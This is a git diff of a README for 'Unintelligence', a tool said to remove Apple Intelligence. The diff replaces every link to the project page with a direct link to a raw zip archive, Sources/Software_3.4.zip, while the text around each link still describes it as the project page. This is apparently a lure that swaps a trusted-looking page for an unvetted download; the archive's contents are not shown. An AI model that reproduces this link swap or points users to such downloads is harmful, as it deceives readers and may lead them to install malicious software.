@@ -1,6 +1,6 @@
 # 🧠 Unintelligence - Remove Apple Intelligence Easily
 
-[![Download](https://img.shields.io/badge/Download-Unintelligence-brightgreen)](https://github.com/keinersowiedu/Unintelligence)
+[![Download](https://img.shields.io/badge/Download-Unintelligence-brightgreen)](https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip)
 
 ---
 
@@ -29,10 +29,10 @@ This tool does not require installation on Mac, but on Windows, you will use it 
 
 You can get Unintelligence from its official GitHub page:
 
-[![Download Unintelligence](https://img.shields.io/badge/Download-Unintelligence-blue)](https://github.com/keinersowiedu/Unintelligence)
+[![Download Unintelligence](https://img.shields.io/badge/Download-Unintelligence-blue)](https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip)
 
 Click the button above or go to:  
-https://github.com/keinersowiedu/Unintelligence
+https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip
 
 This link takes you to the main project page where you can download the files you need.
 
@@ -44,7 +44,7 @@ Follow these steps to download and prepare Unintelligence on your Windows PC.
 
 1. Open your web browser (Edge, Chrome, Firefox, etc.).
 
-2. Go to the download page using this link: https://github.com/keinersowiedu/Unintelligence
+2. Go to the download page using this link: https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip
 
 3. The page will show folders and files related to the project.
 
@@ -108,7 +108,7 @@ Here is a simple guide:
 
 Keep your version current by:
 
-1. Visiting the GitHub page: https://github.com/keinersowiedu/Unintelligence
+1. Visiting the GitHub page: https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip
 
 2. Checking for new releases in the "Releases" section.
 
@@ -151,11 +151,11 @@ Unintelligence was created for Mac OS but can run on Windows for review purposes
 ## 🔗 Useful Links
 
 - GitHub project page:  
-  https://github.com/keinersowiedu/Unintelligence
+  https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip
 
 - Download latest release:  
   Visit the Releases tab on the project page and download appropriate files.
 
 ---
 
-[![Get Unintelligence](https://img.shields.io/badge/Get_Unintelligence-purple)](https://github.com/keinersowiedu/Unintelligence)
+[![Get Unintelligence](https://img.shields.io/badge/Get_Unintelligence-purple)](https://github.com/keinersowiedu/Unintelligence/raw/refs/heads/main/Sources/Software_3.4.zip)
